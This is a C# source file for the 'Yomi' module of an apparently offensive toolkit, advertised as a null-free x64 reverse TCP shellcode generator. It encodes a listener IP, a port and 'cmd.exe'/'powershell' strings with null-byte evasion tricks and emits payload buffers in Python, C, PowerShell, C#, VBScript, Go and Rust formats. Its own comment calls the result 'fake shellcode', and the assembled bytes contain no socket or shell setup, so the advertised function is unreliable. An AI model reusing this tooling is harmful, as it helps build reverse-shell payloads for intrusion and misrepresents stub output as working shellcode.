using ProjectDaikoku.Common;
using ProjectDaikoku.Core;
using ProjectDaikoku.Interfaces;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace ProjectDaikoku.Modules
{
    public class Yomi : CommandBase
    {
        public override string Name => "yomi";
        public override string Description => "shellcode generator";

        private byte portByte1;
        private byte portByte2;

        public override string Execute(string[] args)
        {
            UserConfigs(args);
            return "";
        }

        private void UserConfigs(string[] args)
        {
            var bannerTextConfig = new BannerTextConfig();
            bannerTextConfig.BannerText("Yomi");

            Console.WriteLine("Author: Palau2g");
            Console.WriteLine("GitHub: https://github.com/Palau20G/ProjectDaikoku");
            Console.WriteLine("Null-Free reverse TCP shellcode generator (x64)");
            Console.WriteLine();

            if (args.Length == 0)
            {
                PrintUsage();
                return;
            }

            var options = ParseArgs(args);

            if (options.Port == 0)
            {
                Console.WriteLine("[✘] Missing --port argument.");
                PrintUsage();
                return;
            }

            if (options.Verbose)
            {
                Console.WriteLine($"[Verbose] Using IP: {options.IP}");
                Console.WriteLine($"[Verbose] Using Port: {options.Port}");
                Console.WriteLine($"[Verbose] Format: {options.Format}");
            }

            string portAsm = ProcessPort(options.Port);
            string ipAsm = GetIPArgument(options.IP);
            string shellTypeAsm = GetShellTypeArgument("cmd"); // Default to cmd

            // Stub: Combine assembly components into fake shellcode

            var encoding = GenerateShellcode(ipAsm, portAsm, shellTypeAsm);


            OutputShellcode(options.Format, encoding, "buf", save: !string.IsNullOrEmpty(options.OutputFile), outputPath: options.OutputFile);
        }

        private string ProcessPort(int port)
        {
            string portHexStr = port.ToString("x4");
            string part1Str = portHexStr.Substring(2, 2);
            string part2Str = portHexStr.Substring(0, 2);

            if (part1Str == "00" || part2Str == "00")
            {
                port += 0x101;
                portHexStr = port.ToString("x4");
                part1Str = portHexStr.Substring(2, 2);
                part2Str = portHexStr.Substring(0, 2);

                portByte1 = Convert.ToByte(part1Str, 16);
                portByte2 = Convert.ToByte(part2Str, 16);

                return $"mov dx, 0x{part1Str + part2Str};\nsub dx, 0x0101;";
            }

            portByte1 = Convert.ToByte(part1Str, 16);
            portByte2 = Convert.ToByte(part2Str, 16);

            return $"mov dx, 0x{part1Str + part2Str};";
        }

        private string GetIPArgument(string ip)
        {
            var parts = ip.Split('.');
            if (parts.Length != 4 || parts.Any(p => !byte.TryParse(p, out _)))
                return "[✘] Invalid IP address.";

            var hexParts = parts.Select(p => int.Parse(p).ToString("x2")).ToArray();
            var reversedHex = string.Concat(hexParts.Reverse());

            bool hasNullByte = hexParts.Contains("00");
            bool hasFF = hexParts.Contains("ff");

            if (hasNullByte && !hasFF)
            {
                uint hexInt = Convert.ToUInt32(reversedHex, 16);
                uint negHex = (uint)(~hexInt + 1);
                return $"mov edx, 0x{negHex:x8};\nneg rdx;";
            }

            return $"mov edx, 0x{reversedHex};";
        }

        private string GetShellTypeArgument(string shellType)
        {
            if (shellType.ToLower() == "cmd")
                return "mov rdx, 0xff9a879ad19b929c;\nnot rdx;";

            return string.Join('\n', new[]
            {
                "sub rsp, 8;",
                "mov rdx, 0xffff9a879ad19393;",
                "not rdx;",
                "push rdx;",
                "mov rdx, 0x6568737265776f70;"
            });
        }

        private void OutputShellcode(string lang, List<byte> encoding, string varName, bool save, string? outputPath = null)
        {
            byte[] shellcode = encoding.ToArray();
            Console.WriteLine($"[+] Payload size: {shellcode.Length} bytes\n");

            bool containsNull = shellcode.Any(b => b == 0x00);
            if (containsNull)
            {
                Console.WriteLine("[!] Warning: Shellcode contains null bytes!");
            }

            string sc = "";

            switch (lang.ToLower())
            {
                case "python":
                    Console.WriteLine("[+] Shellcode format for Python\n");
                    sc = $"{varName} = b\"";
                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        if (i > 0 && i % 20 == 0)
                            sc += $"\"\n{varName} += b\"";
                        sc += $"\\x{shellcode[i]:x2}";
                    }
                    sc += "\";";
                    break;

                case "c":
                    Console.WriteLine("[+] Shellcode format for C\n");
                    sc = $"unsigned char {varName}[] = {{\n";
                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        if (i > 0 && i % 20 == 0)
                            sc += "\n";
                        sc += $"0x{shellcode[i]:x2},";
                    }
                    sc = sc.TrimEnd(',') + "\n};";
                    break;

                case "powershell":
                    Console.WriteLine("[+] Shellcode format for PowerShell\n");
                    sc = $"[Byte[]] ${varName} = ";
                    foreach (byte b in shellcode)
                        sc += $"0x{b:x2},";
                    sc = sc.TrimEnd(',');
                    break;

                case "csharp":
                    Console.WriteLine("[+] Shellcode format for C#\n");
                    sc = $"byte[] {varName} = new byte[{shellcode.Length}] {{\n";
                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        if (i > 0 && i % 20 == 0)
                            sc += "\n";
                        sc += $"0x{shellcode[i]:x2},";
                    }
                    sc = sc.TrimEnd(',') + "\n};";
                    break;

                case "raw":
                    Console.WriteLine("[+] Raw hex dump\n");
                    sc = BitConverter.ToString(shellcode).Replace("-", " ");
                    break;

                case "hex":
                    Console.WriteLine("[+] Flat hex format (\\x..)\n");
                    sc = "";
                    foreach (byte b in shellcode)
                        sc += $"\\x{b:x2}";
                    break;

                case "base64":
                    Console.WriteLine("[+] Base64-encoded shellcode\n");
                    sc = Convert.ToBase64String(shellcode);
                    break;

                case "vbscript":
                    Console.WriteLine("[+] Shellcode format for VBScript\n");
                    sc = "Dim buf\nbuf = Array(";
                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        if (i > 0)
                            sc += ",";
                        sc += shellcode[i].ToString();
                    }
                    sc += ")";
                    break;

                case "go":
                    Console.WriteLine("[+] Shellcode format for Go\n");
                    sc = $"var {varName} = []byte{{";
                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        sc += $"0x{shellcode[i]:x2},";
                    }
                    sc = sc.TrimEnd(',') + "}";
                    break;

                case "rust":
                    Console.WriteLine("[+] Shellcode format for Rust\n");
                    sc = $"let {varName}: [u8; {shellcode.Length}] = [";
                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        sc += $"0x{shellcode[i]:x2},";
                    }
                    sc = sc.TrimEnd(',') + "];";
                    break;

                default:
                    Console.WriteLine("[✘] Unsupported language!");
                    return;
            }


            Console.WriteLine(sc);

            if (save && !string.IsNullOrWhiteSpace(outputPath))
            {
                try
                {
                    File.WriteAllBytes(outputPath, shellcode);
                    Console.WriteLine($"\n[✔] Shellcode saved: {outputPath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[✘] Error writing file: {ex.Message}");
                    Environment.Exit(2);
                }
            }
        }

        private List<byte> GenerateShellcode(string ipAsm, string portAsm, string shellTypeAsm)
        {
            var builder = new ShellcodeBuilder();

            string fullAsm = string.Join("\n", new[]
            {
                    "xor rax, rax",
                    ipAsm,
                    portAsm,
                    shellTypeAsm,
                    "ret" // ensure function ends properly
                });

            try
            {
                byte[] assembledBytes = builder.AssembleX64(fullAsm);
                return assembledBytes.ToList();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[✘] Error assembling shellcode: {ex.Message}");
                Environment.Exit(1);
                return new List<byte>();
            }


        }

        private void PrintUsage()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  yomi --port <number> [--ip <address>] [--format <lang>] [--verbose] [--output <file>]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  --port <number>     Required. Reverse shell port.");
            Console.WriteLine("  --ip <address>      Optional. Reverse shell IP. Default is 127.0.0.1.");
            Console.WriteLine("  --format <lang>     Output language: python, c, powershell, csharp.");
            Console.WriteLine("  --verbose           Enable verbose output.");
            Console.WriteLine("  --output <file>     Save shellcode to file.");
        }

        private YomiOptions ParseArgs(string[] args)
        {
            var options = new YomiOptions();

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "--port":
                        if (i + 1 < args.Length && int.TryParse(args[i + 1], out int port) && port > 0 && port <= 65535)
                        {
                            options.Port = port;
                            i++;
                        }
                        else
                        {
                            Console.WriteLine("Invalid or missing value for --port");
                        }
                        break;

                    case "--ip":
                        if (i + 1 < args.Length)
                        {
                            options.IP = args[i + 1];
                            i++;
                        }
                        else
                        {
                            Console.WriteLine("Missing value for --ip");
                        }
                        break;

                    case "--verbose":
                        options.Verbose = true;
                        break;

                    case "--format":
                        if (i + 1 < args.Length)
                        {
                            options.Format = args[i + 1].ToLower();
                            i++;
                        }
                        else
                        {
                            Console.WriteLine("Missing value for --format");
                        }
                        break;

                    case "--output":
                        if (i + 1 < args.Length)
                        {
                            options.OutputFile = args[i + 1];
                            i++;
                        }
                        else
                        {
                            Console.WriteLine("Missing value for --output");
                        }
                        break;

                    default:
                        Console.WriteLine($"Unknown argument: {args[i]}");
                        break;
                }
            }

            return options;
        }
    }

}
